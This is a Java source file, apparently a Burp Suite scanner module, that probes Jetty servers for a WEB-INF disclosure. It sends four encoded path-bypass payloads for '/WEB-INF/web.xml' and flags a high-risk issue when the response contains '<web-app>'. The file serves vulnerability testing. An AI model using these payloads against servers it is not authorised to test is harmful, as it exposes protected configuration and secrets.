package burp.scan.active.poc;

import burp.IBurpExtenderCallbacks;
import burp.IScanIssue;
import burp.scan.active.ModuleBase;
import burp.scan.active.ModuleMeta;
import burp.scan.active.feature.RunOnce;
import burp.scan.lib.GtScanIssue;
import burp.scan.lib.Risk;
import burp.scan.lib.web.WebPageInfo;
import burp.scan.lib.web.utils.GtSession;
import burp.scan.lib.web.utils.GtURL;
import burp.scan.lib.Confidence;
import burp.scan.tags.TagTypes;
import burp.scan.tags.TagUtils;

import java.io.IOException;
import java.util.HashSet;
import java.util.Set;

public class JettyWEBINFLeak implements ModuleBase, RunOnce {
    static String[] PAYLOADS = {
            "%2e/WEB-INF/web.xml",
            "/%u002e/WEB-INF/web.xml",
            "/.%00/WEB-INF/web.xml",
            "/a/b/..%00/WEB-INF/web.xml"
    };
    @Override
    public void scan(IBurpExtenderCallbacks callbacks, WebPageInfo webInfo) {
        if (!webInfo.getSiteInfo().hasTag(TagTypes.Jetty_Java)) {
            return ;
        }
        GtURL url = new GtURL(webInfo.getUrl());
        String baseUrl = url.getBaseUrl();
        GtSession request = new GtSession();
        for (var payload : PAYLOADS) {
            String targetUrl = baseUrl + payload;
            try {
                var response = request.get(targetUrl);

                String res = new String(response.getBody());
                if (res.contains("<web-app>")) {
                    IScanIssue issue = new GtScanIssue(
                            webInfo.getHttpRequestResponse().getHttpService(),
                            url.getURL(),
                            webInfo.getHttpRequestResponse(),
                            "Jetty WEB INF Leak",
                            "",
                            "",
                            Risk.High,
                            Confidence.Certain
                    );
                    callbacks.addScanIssue(issue);

                }
            } catch (IOException e) {
                callbacks.printError(e.getLocalizedMessage());
            }
        }
    }

    @Override
    public Set<String> getTags() {
        Set<String> tags = new HashSet<>();
        tags.add(TagUtils.toStandardName(TagTypes.Jetty_Java));
        return tags;
    }

    @Override
    public ModuleMeta getMetadata() {
        return null;
    }
}
